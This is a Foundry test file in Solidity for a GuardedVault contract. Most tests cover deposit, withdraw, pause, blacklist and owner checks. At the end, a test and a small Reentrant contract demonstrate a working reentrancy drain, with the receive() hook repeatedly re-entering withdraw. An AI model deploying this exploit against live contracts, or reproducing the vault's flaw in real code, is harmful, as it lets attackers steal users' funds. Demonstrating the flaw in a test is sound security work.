// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/GuardedVault.sol";

contract GuardedVaultTest is Test {
    GuardedVault vault;
    address owner = address(this);
    address guardian = address(0xBEEF);
    address alice = address(0xA11CE);
    address attacker = address(0xBAD);

    function setUp() public {
        vault = new GuardedVault();
        vault.setGuardian(guardian);
        vm.deal(alice, 10 ether);
        vm.deal(attacker, 1 ether);
    }

    function test_deposit() public {
        vm.prank(alice);
        vault.deposit{value: 1 ether}();
        assertEq(vault.balances(alice), 1 ether);
    }

    function test_withdraw() public {
        vm.startPrank(alice);
        vault.deposit{value: 2 ether}();
        vault.withdraw(1 ether);
        assertEq(vault.balances(alice), 1 ether);
        vm.stopPrank();
    }

    function test_pause_blocksDeposit() public {
        vm.prank(guardian);
        vault.pause();
        vm.prank(alice);
        vm.expectRevert("PAUSED");
        vault.deposit{value: 1 ether}();
    }

    function test_blacklist_blocksWithdraw() public {
        vm.prank(alice);
        vault.deposit{value: 1 ether}();
        vm.prank(guardian);
        vault.blacklist(alice);
        vm.prank(alice);
        vm.expectRevert("BLACKLISTED");
        vault.withdraw(1 ether);
    }

    function test_onlyOwnerSetsGuardian() public {
        vm.prank(alice);
        vm.expectRevert("NOT_OWNER");
        vault.setGuardian(alice);
    }

    // demonstrates the reentrancy seam
    function test_reentrancy() public {
        vm.prank(alice);
        vault.deposit{value: 5 ether}();

        Reentrant re = new Reentrant(vault);
        vm.deal(address(re), 1 ether);
        re.attack{value: 1 ether}();

        // attacker drained more than deposited
        assertGt(address(re).balance, 1 ether);
    }
}

contract Reentrant {
    GuardedVault target;
    uint256 count;

    constructor(GuardedVault _t) { target = _t; }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(1 ether);
    }

    receive() external payable {
        if (count < 4 && address(target).balance >= 1 ether) {
            count++;
            target.withdraw(1 ether);
        }
    }
}
